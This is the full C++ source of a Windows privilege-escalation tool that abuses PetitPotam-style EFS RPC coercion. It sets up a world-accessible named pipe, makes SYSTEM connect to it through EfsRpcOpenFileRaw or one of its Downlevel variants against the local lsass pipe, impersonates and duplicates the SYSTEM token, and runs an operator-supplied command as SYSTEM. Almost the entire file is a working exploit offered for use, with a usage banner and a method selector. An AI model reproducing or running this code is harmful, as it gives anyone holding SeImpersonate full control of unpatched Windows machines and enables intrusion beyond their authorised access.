
#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")
#include "efsr_h.h"
#include <iostream>
#include <userenv.h>
#include <tchar.h>
#include <strsafe.h>
#include <sddl.h>
#include <thread>
#include <string>

BOOL g_bInteractWithConsole = TRUE;
LPWSTR g_pwszCommandLine = NULL;

VOID PrintUsage(wchar_t** argv)
{
	wprintf(
		L"\nPetitPotam For LPE (by @Crispr)\nProvided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM\n"
	);
	printf("Author:Crispr\n");
	printf("[+]Usage:%ws -m <EFS-API-to-use> -c <CMD>\n\n", argv[0]);
	wprintf(L"1: EfsRpcOpenFileRaw (fixed with CVE-2021-36942)\n");
	wprintf(L"2: EfsRpcEncryptFileSrv_Downlevel\n");
	wprintf(L"3: EfsRpcDecryptFileSrv_Downlevel\n");
	wprintf(L"4: EfsRpcQueryUsersOnFile_Downlevel\n");
	wprintf(L"5: EfsRpcQueryRecoveryAgents_Downlevel\n");
	wprintf(L"6: EfsRpcRemoveUsersFromFile_Downlevel\n");
	wprintf(L"7: EfsRpcAddUsersToFile_Downlevel\n");
	wprintf(
		L"Arguments:\n -c <CMD>\tExecute the command *CMD*\n"
	);
	return;
}

void GetSystemAsImpersonatedUser(HANDLE hToken)
{
	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}
	
	wprintf(L"[+]DuplicateTokenEx() OK\n");

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
	{
		goto cleanup;
	}

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	wprintf(L"[+]GetSystemDirectory: %ws\n", pwszCurrentDirectory);

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = L"WinSta0\\default";

	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{
			wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

			RevertToSelf();

			
			if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
			{
				wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}
			else
			{
				wprintf(L"[+] CreateProcessWithTokenW() OK\n");
			}
	
		}
		else
		{
			wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}
	else
	{
		wprintf(L"[+] CreateProcessAsUser() OK\n");
	}

	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return;


	/*if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"cmd.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
		CloseHandle(hSystemTokenDup);
		return;
	}
	else
	{
		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		return;
	}*/
}

void StartNamedPipeAndGetSystem()
{
	printf("start StartNamedPipeAndGetSystem\n");
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	LPWSTR pwszPipeName;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	DWORD buffer_size = 0;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\crispr\\pipe\\srvsvc");

	

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
	{
		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
		if (ConnectNamedPipe(hPipe, NULL)) {
			wprintf(L"[+] A client connected!\n");
		}
		else {
			wprintf(L"[-] Do Not Connect!\n");
			CloseHandle(hPipe);
			return;
		}

		if (ImpersonateNamedPipeClient(hPipe)) {
			if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
				GetSystemAsImpersonatedUser(hToken);
				CloseHandle(hPipe);
			}
		}
		else {
			printf("CreateNamedPipe error\n");
			CloseHandle(hPipe);
		}
		return ;
	}
}

void ConnectEvilPipe(int choice) 
{
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)L"\\\\127.0.0.1",//这里取NULL也能代表本地连接
		(RPC_WSTR)L"\\pipe\\lsass",
		NULL,
		&pszStringBinding
	);
	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
	wprintf(L"[*] String binding: %ws\r\n", pszStringBinding);
	//绑定接口
	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n", status);

	//释放资源
	status = RpcStringFree(&pszStringBinding);
	wprintf(L"RpcStringFree code:%d\n", status);
	RpcTryExcept{
		PVOID pContent;
		LPWSTR pwszFileName;
		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/crispr\\C$\\x");

		long result;
		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
		switch (choice)
		{
		case 1:
			result = Proc0_EfsRpcOpenFileRaw_Downlevel(
				BindingHandle,
				&pContent,
				pwszFileName,
				0
			);
			//wprintf(L"[*] EfsRpcOpenFileRaw_Downlevel status code: %d\r\n", result);
			break;
		case 2:
			result = Proc4_EfsRpcEncryptFileSrv_Downlevel(BindingHandle, pwszFileName);
			//wprintf(L"[*] EfsRpcEncryptFileSrv_Downlevel status code: %d\r\n", result);
			break;
		case 3:
			result = Proc5_EfsRpcDecryptFileSrv_Downlevel(BindingHandle, pwszFileName,0);
			//wprintf(L"[*] EfsRpcDecryptFileSrv_Downlevel status code: %d\r\n", result);
			break;
		case 4:
			Struct_220_t * blub_1;
			result = Proc6_EfsRpcQueryUsersOnFile_Downlevel(BindingHandle, pwszFileName, &blub_1);
			//wprintf(L"[*] EfsRpcQueryUsersOnFile_Downlevel status code: %d\r\n", result);
			break;
		case 5:
			Struct_220_t * blub_2;
			result = Proc7_EfsRpcQueryRecoveryAgents_Downlevel(BindingHandle, pwszFileName, &blub_2);
			//wprintf(L"[*] EfsRpcQueryRecoveryAgents_Downlevel status code: %d\r\n", result);
			break;
		case 6:
			Struct_220_t  blub_3;
			result = Proc8_EfsRpcRemoveUsersFromFile_Downlevel(BindingHandle, pwszFileName, &blub_3);
			//wprintf(L"[*] EfsRpcRemoveUsersFromFile_Downlevel status code: %d\r\n", result);
			break;
		case 7:
			Struct_346_t blub_4;
			result = Proc9_EfsRpcAddUsersToFile_Downlevel(BindingHandle, pwszFileName, &blub_4);
			//wprintf(L"[*] EfsRpcAddUsersToFile_Downlevel status code: %d\r\n", result);
			break;
		default:
			break;
		}
			
		
		

		
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
		LocalFree(pwszFileName);
	}
		RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
	}RpcEndExcept

		

}

int wmain(int argc, wchar_t** argv)
{
	int choice;
	
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage(argv);
			return 0;
		case 'c':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				g_pwszCommandLine = argv[1];
			}
			else
			{
				wprintf(L"[-] Missing value for option: -c\n");
				PrintUsage(argv);
				return -1;
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				size_t len = wcslen(argv[1]) + 1;
				size_t converted = 0;
				char* index;
				index = (char*)malloc(sizeof(char) * len);
				wcstombs_s(&converted, index, len, argv[1], _TRUNCATE);
				choice = atoi(index);
			}
			else
			{
				wprintf(L"[-] Missing value for option: -c\n");
				PrintUsage(argv);
				return -1;
			}
			break;
		default:
			wprintf(L"[-] Invalid argument: %ls\n", argv[1]);
			PrintUsage(argv);
			return -1;
		}
		++argv;
		--argc;
	}
	if (!g_pwszCommandLine)
	{
		wprintf(L"[-] Please specify a command to execute\n");
		wprintf(L"[*] You can use -h to get help\n");
		return -1;
	}

	std::thread t{ StartNamedPipeAndGetSystem };
	t.detach();
	Sleep(1000);
	ConnectEvilPipe(choice);
	Sleep(1500);
	return 0;
}



// 下面的函数是为了满足链接需要而写的，没有的话会出现链接错误
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}
void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}